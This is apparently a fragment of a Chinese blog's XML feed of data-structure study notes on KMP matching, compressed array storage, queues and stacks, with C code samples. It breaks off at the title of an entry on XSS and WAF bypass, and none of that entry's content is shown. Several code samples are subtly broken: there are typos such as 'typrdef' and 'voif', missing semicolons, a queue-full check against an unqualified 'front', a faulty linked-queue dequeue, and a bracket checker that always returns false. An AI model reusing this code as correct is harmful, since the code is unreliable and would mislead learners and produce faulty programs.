class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Index_KMP</span><span class="hljs-params">(SString S,SString T,<span class="hljs-type">int</span> next[])</span><br>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>,j=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;=S.length&amp;&amp;j&lt;=T.length)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(j==<span class="hljs-number">0</span>||S.ch[i]==T.ch[j])<br>        &#123;<br>            ++i;<br>            ++j;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            j=next[j]<br>    &#125;<br>    <span class="hljs-keyword">if</span>(j&gt;T.length)<br>        <span class="hljs-keyword">return</span> i-T.length;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/5.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;KMP算法的最坏时间复杂度是O(m+n)，其中，求next数组的时间复杂度为O(m)，模式匹配过程中最坏时间复杂度是O(n)</p><ul><li>求next数组</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/6.jpg" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/7.jpg" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/8.jpg" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="扩展：-乱码问题"><a href="#扩展：-乱码问题" class="headerlink" title="扩展： 乱码问题"></a>扩展： 乱码问题</h4><p>&emsp;&emsp;在文件中，原本采用的某一套编码规则y=f(x)，但当打开该文件时，你的软件以为你采用的是另外一套编码规则y=g(x)，因此存在打开是乱码的情况</p>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数组压缩存储</title>
    <link href="/2022/10/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/"/>
    <url>/2022/10/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h1 id="数组压缩存储"><a href="#数组压缩存储" class="headerlink" title="数组压缩存储"></a>数组压缩存储</h1><h4 id="1-一维数组的存储结构"><a href="#1-一维数组的存储结构" class="headerlink" title="1.一维数组的存储结构"></a>1.一维数组的存储结构</h4><p>&emsp;&emsp;一般而言，如果没有特别强调，数组下标默认从零开始，各个数组元素大小相同，且物理上连续存放</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/1.jpg" style="zoom:100%;" /></center><p>&emsp;&emsp;由上图可知，数组元素a[i]的存放地址为LOC+i*sizeof(ElemType)</p><p>&emsp;</p><h4 id="2-二维数组的存储结构"><a href="#2-二维数组的存储结构" class="headerlink" title="2.二维数组的存储结构"></a>2.二维数组的存储结构</h4><p>&emsp;&emsp; 二维数组其实就是在一维数组的基础上多加了一个维度，分出了行和列的区别，这也导致二维数组的存储结构存在两种方式，行优先和列优先。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/2.jpg" style="zoom:100%;" /></center><p>&emsp;&emsp;列优先时，数组元素a[i]的存放地址为LOC+(j * m+i) * sizeof(ElemType)</p><p>&emsp;&emsp;行优先时，数组元素a[i]的存放地址为LOC+(i * n+j) * sizeof(ElemType)</p><h4 id="3-特殊矩阵的压缩存储方式"><a href="#3-特殊矩阵的压缩存储方式" class="headerlink" title="3.特殊矩阵的压缩存储方式"></a>3.特殊矩阵的压缩存储方式</h4><ul><li><h6 id="对称矩阵的压缩存储"><a href="#对称矩阵的压缩存储" class="headerlink" title="对称矩阵的压缩存储"></a>对称矩阵的压缩存储</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/3.jpg" style="zoom:100%;" /></center><p>&emsp;&emsp;由于对称矩阵的对称特性，实现确认存储的数组大小为（1+2+3+…+n）=(1+n)*n/2</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/4.jpg" style="zoom:100%;" /></center><ul><li><h6 id="三角矩阵的压缩存储"><a href="#三角矩阵的压缩存储" class="headerlink" title="三角矩阵的压缩存储"></a>三角矩阵的压缩存储</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/5.jpg" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/6.jpg" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/7.jpg" style="zoom:100%;" /></center><ul><li><h6 id="三对角矩阵的压缩存储"><a href="#三对角矩阵的压缩存储" class="headerlink" title="三对角矩阵的压缩存储"></a>三对角矩阵的压缩存储</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/8.jpg" style="zoom:100%;" /></center><ul><li>稀疏矩阵的压缩存储</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/9.jpg" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/10.jpg" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="4-常见考试类型"><a href="#4-常见考试类型" class="headerlink" title="4.常见考试类型"></a>4.常见考试类型</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%94/11.jpg" style="zoom:100%;" /></center>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>队列</title>
    <link href="/2022/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/"/>
    <url>/2022/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><h4 id="1-队列"><a href="#1-队列" class="headerlink" title="1.队列"></a>1.队列</h4><p>&emsp;&emsp;简单的理解，队列是只允许在一端进行插入，在另外一端删除的线性表</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/1.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-队列的基本操作"><a href="#2-队列的基本操作" class="headerlink" title="2.队列的基本操作"></a>2.队列的基本操作</h4><ul><li>InitQueue(&amp;Q)：初始化队列。构造一个队列，分配内存空间。</li><li>DestroyQueue(&amp;Q)：销毁队列。销毁并释放队列Q所占用的内存空间</li><li>EnQueue(&amp;Q,x)：入队，若队列Q未满，则将x加入栈中成为新的队尾</li><li>DeQueue(&amp;Q,&amp;x)：出队，若队列Q非空，则将队头元素付给x</li><li>GetHead(Q,&amp;x)：读队头元素，若队列Q非空，则将队头元素赋值给x</li></ul><p>&emsp;</p><h4 id="3-队列顺序实现"><a href="#3-队列顺序实现" class="headerlink" title="3.队列顺序实现"></a>3.队列顺序实现</h4><ul><li>初始化</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 10</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data[MaxSize];<br>    <span class="hljs-type">int</span> front,rear;      <span class="hljs-comment">//队头指针和队尾指针</span><br>&#125;SqQueue;<br><br><span class="hljs-comment">//初始化队列</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitQueue</span><span class="hljs-params">(SqQueue &amp;Q)</span><br>&#123;<br>    Q.rear=Q.front=<span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>入队</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">EnQueue</span><span class="hljs-params">(SqQueue &amp;Q,ElemType x)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>((Q.rear+<span class="hljs-number">1</span>)%MaxSize==front)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    Q.data[Q.rear]=x;<br>    Q.rear=(Q.rear+<span class="hljs-number">1</span>)%MaxSize;   <span class="hljs-comment">//队尾指针加一取模</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/2.png" style="zoom:80%;" /></center><ul><li>出队</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">DeQueue</span><span class="hljs-params">(SqQueue &amp;Q,ElemType &amp;x)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(Q.rear==Q.front)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    x=Q.data[Q.front];<br>    Q.front=(Q.front+<span class="hljs-number">1</span>)%MaxSize;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>队列元素个数</li></ul><p>&emsp;&emsp;(rear+MaxSize-front)%MaxSize</p><p>&emsp;</p><h4 id="4-队列链式实现"><a href="#4-队列链式实现" class="headerlink" title="4.队列链式实现"></a>4.队列链式实现</h4><p>&emsp;&emsp;使用链式存储方式实现的队列，实现后插和头删的单链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LinkNode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LinkNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;LinkNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    LinkNode *front,*rear;<br>&#125;LinkQueue;<br></code></pre></td></tr></table></figure><ul><li>初始化</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">InitQueue</span><span class="hljs-params">(LinkQueue &amp;Q)</span><br>&#123;<br>    Q.front=Q.rear=(LinkNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkNode));<br>    Q.front-&gt;next=<span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>入队</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">EnQueue</span><span class="hljs-params">(LinkQueue &amp;Q,ElemType x)</span><br>&#123;<br>    LinkNode *s=(LinkNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkNode));<br>    s-&gt;data=x;<br>    s-&gt;next=<span class="hljs-literal">NULL</span>;<br>    Q.rear-&gt;next=s;<br>    Q.rear=s;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>出队</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">DeQueue</span><span class="hljs-params">(LinkQueue &amp;Q,ElemType &amp;x)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(Q.front==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    LinkNode *p=Q.front;<br>    x=p-&gt;data;<br>    Q.front=p-&gt;next;<br>    <span class="hljs-keyword">if</span>(Q.rear==p)<br>    &#123;<br>        Q.front=<span class="hljs-literal">NULL</span>;<br>        Q.rear=<span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="5-双端队列"><a href="#5-双端队列" class="headerlink" title="5.双端队列"></a>5.双端队列</h4><ul><li>定义</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/2.jpg" style="zoom:60%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/3.jpg" style="zoom:60%;" /></center><ul><li>考点</li></ul><p>&emsp;&emsp;对输出序列合法性的判断</p><p>&emsp;</p><h4 id="6-队列的应用——树的层次遍历"><a href="#6-队列的应用——树的层次遍历" class="headerlink" title="6.队列的应用——树的层次遍历"></a>6.队列的应用——树的层次遍历</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/4.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="7-队列的应用——图的广度优先遍历"><a href="#7-队列的应用——图的广度优先遍历" class="headerlink" title="7.队列的应用——图的广度优先遍历"></a>7.队列的应用——图的广度优先遍历</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/5.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="8-队列的应用——操作系统"><a href="#8-队列的应用——操作系统" class="headerlink" title="8.队列的应用——操作系统"></a>8.队列的应用——操作系统</h4><ul><li>多个进程争抢着使用有限的系统资源时，先来先服务是一种常用策略。</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/6.jpg" style="zoom:60%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%9B/7.jpg" style="zoom:800%;" /></center>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈</title>
    <link href="/2022/10/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%89/"/>
    <url>/2022/10/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h4 id="1-栈的定义"><a href="#1-栈的定义" class="headerlink" title="1.栈的定义"></a>1.栈的定义</h4><p>&emsp;&emsp;简单的理解，栈是只允许在一端进行插入或者操作的线性表</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%89/1.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-栈的基本操作"><a href="#2-栈的基本操作" class="headerlink" title="2.栈的基本操作"></a>2.栈的基本操作</h4><ul><li>InitStack(&amp;S)：初始化栈。构造一个空栈，分配内存空间。</li><li>DestroyStack(&amp;L)：销毁栈。销毁并释放栈S所占用的内存空间</li><li>Push(&amp;S,x)：进栈，若栈S未满，则将x加入栈中成为新的栈顶</li><li>Pop(&amp;S,&amp;x)：出栈，若栈S非空，则弹出栈顶元素，并用x返回</li><li>GetTop(S,&amp;x)：读栈顶元素，用x返回栈顶元素</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%89/2.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-顺序栈"><a href="#3-顺序栈" class="headerlink" title="3.顺序栈"></a>3.顺序栈</h4><ul><li>定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 10</span><br>typrdef <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data[MaxSize];    <span class="hljs-comment">//静态数组存放栈中的元素</span><br>    <span class="hljs-type">int</span> top;<br>&#125;SqStack;<br></code></pre></td></tr></table></figure><ul><li>初始化</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">voif <span class="hljs-title function_">InitStack</span><span class="hljs-params">(SqStack &amp;s)</span><br>&#123;<br>    s.top=<span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>进栈</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(SqStack &amp;S,ElemType x)</span><br>&#123;<br>     <span class="hljs-keyword">if</span>(S.top==MaxSize<span class="hljs-number">-1</span>)<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    S.top = S.top + <span class="hljs-number">1</span>;<br>    S.data[S.top]=x;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;     <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>出栈</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">Pop</span><span class="hljs-params">(SqStack &amp;S,ElemType &amp;x)</span><br>&#123;<br>     <span class="hljs-keyword">if</span>(S.top==<span class="hljs-number">-1</span>)<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    x=S.data[S.top];<br>    S.top = S.top<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;     <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>共享栈</li></ul><p>&emsp;</p><h4 id="4-链栈"><a href="#4-链栈" class="headerlink" title="4.链栈"></a>4.链栈</h4><p>&emsp;&emsp;使用链式存储方式实现的栈，实现头插和后删的单链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Linknode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Linknode</span> *<span class="hljs-title">next</span>;</span><br>&#125;*LiStack;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="5-栈的应用——括号匹配"><a href="#5-栈的应用——括号匹配" class="headerlink" title="5.栈的应用——括号匹配"></a>5.栈的应用——括号匹配</h4><ul><li>流程图</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%89/4.jpg" style="zoom:80%;" /></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">bracketCheck</span><span class="hljs-params">(<span class="hljs-type">char</span> str[],<span class="hljs-type">int</span> length)</span><br>&#123;<br>    SqSTACK S;<br>    InitStack(S);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;length;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(str[i]==<span class="hljs-string">&#x27;(&#x27;</span>||str[i]==<span class="hljs-string">&#x27;[&#x27;</span>||str[i]==<span class="hljs-string">&#x27;&#123;&#x27;</span>)   <span class="hljs-comment">//扫描左括号</span><br>        &#123;<br>            Push(S,str[i]);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(StackEmpty(S))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-type">char</span> topElem;<br>            Pop(S,topElem);     <span class="hljs-comment">//栈顶元素出栈</span><br>            <span class="hljs-keyword">if</span>(str[i]==<span class="hljs-string">&#x27;)&#x27;</span>&amp;&amp;topElem!=<span class="hljs-string">&#x27;(&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span>(str[i]==<span class="hljs-string">&#x27;]&#x27;</span>&amp;&amp;topElem!=<span class="hljs-string">&#x27;[&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span>(str[i]==<span class="hljs-string">&#x27;&#125;&#x27;</span>&amp;&amp;topElem!=<span class="hljs-string">&#x27;&#123;&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;           <br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>总结</li></ul><p>&emsp;&emsp;用栈实现括号匹配，依次扫描所有字符，遇到左括号入栈，遇到有括号则弹出栈顶元素检查是否匹配，匹配失败的情况只有三种：左括号单一，右括号单一，左右括号不匹配。</p><p>&emsp;</p><h4 id="6-栈的应用——表达式求值的应用"><a href="#6-栈的应用——表达式求值的应用" class="headerlink" title="6.栈的应用——表达式求值的应用"></a>6.栈的应用——表达式求值的应用</h4><ul><li><h6 id="emsp-emsp-三种形式的表达式（后缀表达式为重点内容）"><a href="#emsp-emsp-三种形式的表达式（后缀表达式为重点内容）" class="headerlink" title="&emsp;&emsp;三种形式的表达式（后缀表达式为重点内容）"></a>&emsp;&emsp;三种形式的表达式（后缀表达式为重点内容）</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%89/5.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;后缀表达式采用”左优先原则”：只要左边的运算符能先计算，就优先计算左边的。</p><p>&emsp;&emsp;前缀表达式采用“右优先原则”：只要右边的运算符能先计算，就优先计算右边的。</p><ul><li><h6 id="中缀表达式转后缀表达式并计算的实现原理"><a href="#中缀表达式转后缀表达式并计算的实现原理" class="headerlink" title="中缀表达式转后缀表达式并计算的实现原理"></a>中缀表达式转后缀表达式并计算的实现原理</h6></li></ul><p>&emsp;&emsp;用栈实现中中缀表达式的计算：首先初始化两个栈，操作数栈和运算符栈，若扫描到操作数，压入操作数栈，若扫描到运算符或界限符，则按照“中缀转后缀 ”相同的逻辑压入运算符栈（期间也会弹出运算符，每当弹出一个运算符时，就需要再弹出两个操作数栈的栈顶元素并执行相应运算，运算结果再压回操作数栈中）</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%89/6.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-栈的应用——递归的应用"><a href="#8-栈的应用——递归的应用" class="headerlink" title="8.栈的应用——递归的应用"></a>8.栈的应用——递归的应用</h4><ul><li>函数调用特点</li></ul><p>&emsp;&emsp;函数调用的特点是最后被调用的函数最先执行结束，函数调用时，需要用一个栈存储，包括调用返回地址、实参、局部变量。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%89/7.jpg" style="zoom:80%;" /></center><ul><li>递归计算阶乘</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">factorial</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (n==<span class="hljs-number">0</span>||n==<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> n*factorial(n<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> x=factorial(<span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;计算完成&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>递归计算阶乘裴波那契数列</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (n==<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> Fib(n<span class="hljs-number">-1</span>)+Fib(n<span class="hljs-number">-2</span>)<br>&#125;<br><br><span class="hljs-type">int</span> main()<br>&#123;<br>    <span class="hljs-type">int</span> x=Fib(<span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;计算完成&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>缺点</li></ul><p>&emsp;&emsp;太多层递归可能会导致栈溢出，或者包含很多重复的计算，浪费大量的时间时间。</p>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS跨站——WAF绕过及修复</title>
    <link href="/2022/10/11/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/"/>
